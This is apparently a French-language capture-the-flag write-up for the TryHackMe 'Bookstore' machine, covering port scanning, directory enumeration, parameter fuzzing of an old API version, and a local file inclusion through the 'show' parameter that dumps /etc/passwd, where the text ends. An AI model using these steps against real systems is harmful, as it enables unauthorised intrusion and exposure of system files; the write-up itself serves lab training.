---
layout: post
title: "Bookstore - TryHackMe"
date: 2026-02-03
platform: "TryHackMe"
difficulty: "Medium"
category: [LFI, API REST, Werkzeug, SUID]
image: "/assets/bookstore/avatar.png"
description: "Exploiter une faille dans une api rest pour avoir un accès à la machine cible puis réaliser une escalade de privilèges via un binaire SUID."
---
**Objectif**: Exploiter une faille dans une api rest pour avoir un accès à la machine cible puis réaliser une escalade de privilèges

## Configuration

Nous allons associer l’ip cible au nom de domaine `bookstore.thm` en modifiant le fichier `/etc/hosts`

```bash
echo "IP_SERVEUR bookstore.thm" >> /etc/hosts
```

## Enumération

Nous allons scanner les ports ouverts via `nmap`

```bash
nmap -sC -sV -sS bookstore.thm
```

On a le résultat suivant

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Ports ouverts :

- Port SHH(22)
- Port HTTP(80)
- Port non connu 5000 capable d’éxéuter du code python (Python 3.6.9)

## Exploration

En nous rendant à la page d’acceuil `http://bookstore.thm` on a la page suivante

![Image 1](/assets/bookstore/1.png)

Nous allons lister les dossiers cachés à l’aide de `gobuster`

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://bookstore.thm
```

Le résultat est :

```bash
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bookstore.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://bookstore.thm/assets/]
/favicon.ico          (Status: 200) [Size: 15406]
/images               (Status: 301) [Size: 315] [--> http://bookstore.thm/images/]
/index.html           (Status: 200) [Size: 6452]
/javascript           (Status: 301) [Size: 319] [--> http://bookstore.thm/javascript/]
/server-status        (Status: 403) [Size: 278]
Progress: 4085 / 4750 (86.00%)[ERROR] error on word sysuser: timeout occurred during the request
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
```

Le résultat montre la présence du dossier `assets`. En l’explorant on tombe sur le dossier `js` contenant le fichier `api.js` dont le contenu est 

```jsx
function getAPIURL() {
var str = window.location.hostname;
str = str + ":5000"
return str;

    }

async function getUsers() {
    var u=getAPIURL();
    let url = 'http://' + u + '/api/v2/resources/books/random4';
    try {
        let res = await fetch(url);
        return await res.json();
    } catch (error) {
        console.log(error);
    }
}

async function renderUsers() {
    let users = await getUsers();
    let html = '';
    users.forEach(user => {
        let htmlSegment = `<div class="user">
                        <h2>Title : ${user.title}</h3> <br>
                        <h3>First Sentence : </h3> <br>
                        <h4>${user.first_sentence}</h4><br>
                        <h1>Author: ${user.author} </h1> <br> <br>        
                </div>`;

        html += htmlSegment;
   });
   
    let container = document.getElementById("respons");
    container.innerHTML = html;
}
renderUsers();
//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
```

Intéressant! Le commentaire de fin laisse présager que les versions précédentes de l’api contiennent un paramètre vulnérable à un local file inclusion alors que la nouvelle version est plus sécurisée. Cette information nous seras utile plus tard. 

En attendant explorons le service tournant sur le port 5000 via `http://bookstore.thm:5000` 

Il s’agit de la page d’accueil de l’api rest foxy. Nous pouvons essayer de lister les dossiers cachés

```jsx
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://bookstore.thm:5000
```

On a le résultat:

```jsx
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bookstore.thm:5000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/api                  (Status: 200) [Size: 825]
/console              (Status: 200) [Size: 1985]
/robots.txt           (Status: 200) [Size: 45]
===============================================================
Finished
===============================================================
```

En nous rendant sur `http://boockstore.thm:5000/console` un code secret nous est demandé. Etant donné qu’on n’a pas le code on passé à /api. Il s’agit de la documentation de l’API  v2

```
API Documentation
Since every good API has a documentation we have one as well!
The various routes this API currently provides are:

/api/v2/resources/books/all (Retrieve all books and get the output in a json format)

/api/v2/resources/books/random4 (Retrieve 4 random records)

/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)

/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)

/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)

/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)
```

L’api nous permet d’inclure des paramètres dans la requêtes. Or souvenons nous qu’il nous  a été dis qu’un paramètre de l’ancienne version de l’api est vulnérable à une locale file inclusion. Vu qu’on est sur la version 2, la version non sécurisée devrait être la version1. Essayons de lister les paramètres disponibles via `ffuf`

```bash
ffuf -c -u "http://bookstore.thm:5000/api/v1/resources/books?FUZZ=test" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200
```

Résultat: 

```
author
id
published
show
```

Le paramètre `show` semble interessant. Essayons de vérifier si il est vulnérable en lisant le fichier `/etc/passwd` 

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/v
```
